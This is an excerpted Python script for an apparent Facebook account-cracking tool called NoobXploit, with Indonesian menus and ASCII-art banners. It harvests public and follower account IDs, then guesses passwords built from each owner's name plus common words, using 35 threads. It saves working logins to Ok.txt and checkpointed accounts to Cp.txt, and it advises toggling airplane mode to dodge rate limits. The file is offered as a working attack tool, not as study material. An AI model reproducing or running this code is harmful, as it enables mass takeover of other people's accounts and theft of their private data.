...
___logo___ = ("""%s ____\n|  _ \ _   _ _ __ ___  _ __\n%s| | | | | | | '_ ` _ \| '_ \ \n%s| |_| | |_| | | | | | | |_) |\n%s|____/ \__,_|_| |_| |_| .__/\n                      |_|
 ...
 ____  _____                __       ____  ____         __           _   _    
|_   \|_   _|              [  |     |_  _||_  _|       [  |         (_) / |_  
  |   \ | |   .--.    .--.  | |.--.   \ \  / /  _ .--.  | |  .--.   __ `| |-' 
  | |\ \| | / .'`\ \/ .'`\ \| '/'`\ \  > `' <  [ '/'`\ \| |/ .'`\ \[  | | |   
 _| |_\   |_| \__. || \__. ||  \__/ |_/ /'`\ \_ | \__/ || || \__. | | | | |,  
|_____|\____|'.__.'  '.__.'[__;.__.'|____||____|| ;.__/[___]'.__.' [___]\__/  
                                               [__|                           
...
def ___menu___():
    ...
    print("%s[%s3%s]%s Dump Public New ID (2020-2021)"%(H,U,H,P))
    print("%s[%s4%s]%s Dump Public Very Old ID(2006-2009)"%(H,U,H,P))
    print("%s[%s5%s]%s Dump ID Follower Old (2015-2006)"%(H,U,H,P))
    print("%s[%s6%s]%s Dump ID Follower New (2021-2020)"%(H,U,H,P))
    print("%s[%s7%s]%s Dump ID Public Random (2021-2004)"%(H,U,H,P))
    print("%s[%s8%s]%s Dump ID Public Old (2006-2015)"%(H,U,H,P))
    print("%s[%s9%s]%s Dump ID Public New (2022-2020)"%(H,U,H,P))
    print("%s[%s10%s]%s Start Crack %s[%sFast%s/%sSlow%s]"%(B,U,B,P,K,H,K,H,K))
    print("%s[%s11%s]%s View Results"%(H,U,H,P))
    print("%s[%s12%s]%s Report Bug"%(H,U,H,P))
    print("%s[%s13%s]%s Remove Token"%(H,U,H,P))
    ...
    if ___menu___ in ['1','01']:
        ...
        if ___hasilz___ in ['1','01']:
            try:
                ...
                exit("%s[%s!%s]%s NoobXploit Ok.txt Tidak Ada"%(P,M,P,M))
            print("%s "%(P))
            ...
            try:
                ...
                exit("%s[%s!%s]%s Riyajul Cp.txt Tidak Ada"%(P,M,P,M))
            print("%s "%(P))
...
def ___metode___():
    ...
    if ___metode___ in ['1','01']:
        print("\n%s[%s1%s]%s Gunakan Password [Name,Name123,Name12345]"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password [Name,Name123,Name1234,Name12345,Name123456]"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password [Name,Name123,Name1234,Name12345,Sayang,Dll]"%(H,P,H,P))
        ...
        print("\n%s[%sâ€¢%s]%s NoobXploit Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s NoobXploit Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
        ...
        print("\n%s[%s1%s]%s Gunakan Password [Name,Name123,Name12345,Bangladesh,001122]"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password [Name,Name123,Name1234,786786,Name12345,Name123456,Pakistan]"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password [Name,Name123,Name1234,Name12345,Sayang,Dll]"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan Password Manual [ >6 ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
        ...
        try:
            ...
            exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
        print("\n%s[%sâ€¢%s]%s NoobXploit Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s NoobXploit OK Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Gunakan Mode Pesawat Di Angka 1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = user.split('<=>')
